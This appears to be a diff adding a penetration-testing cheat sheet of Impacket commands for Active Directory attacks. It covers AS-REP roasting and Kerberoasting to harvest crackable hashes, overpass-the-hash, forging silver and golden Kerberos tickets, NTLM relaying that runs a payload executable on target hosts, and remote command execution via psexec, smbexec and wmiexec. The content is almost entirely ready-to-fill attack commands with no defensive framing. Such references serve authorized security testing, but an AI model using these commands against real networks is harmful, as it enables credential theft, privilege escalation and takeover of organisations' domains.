@@ -1,0 +1,55 @@
+# Impacket
+## Impacket is a a collection of python classes for working with network protocols
+# https://github.com/SecureAuthCorp/impacket
+
+# Check ASREPRoast for all domain users (creds req)
+python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+# Check ASREPRoast for a list of users (no creds req)
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+
+
+# Kerberoasting by getting SPNs
+python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
+
+
+
+# Overpass the Hash
+## Request the TGT with hash
+python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+
+## Request the TGT with aesKey
+python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+
+## Request the TGT with password
+python getTGT.py <domain_name>/<user_name>:[password]
+
+
+
+# Create a silver ticket by generating the TGS with NTLM
+python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain<domain_name> -spn <service_spn>  <user_name>
+
+# Create a silver ticket by generating the TGS with AES key
+python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn><user_name>
+
+
+# Create a golden ticket by generating the TGS with NTLM
+python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+
+# Create a golden ticket by generating the TGS with AES key
+python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+
+
+# NTLMRelay SMB relay to shell
+python ntlmrelayx.py -tf target_ips.txt ./payload.exe
+
+
+
+# Execute a remote command (must set TGT for impacket use first)
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+
+## Set the TGT for impacket use
+export KRB5CCNAME=<TGT_ccache_file>
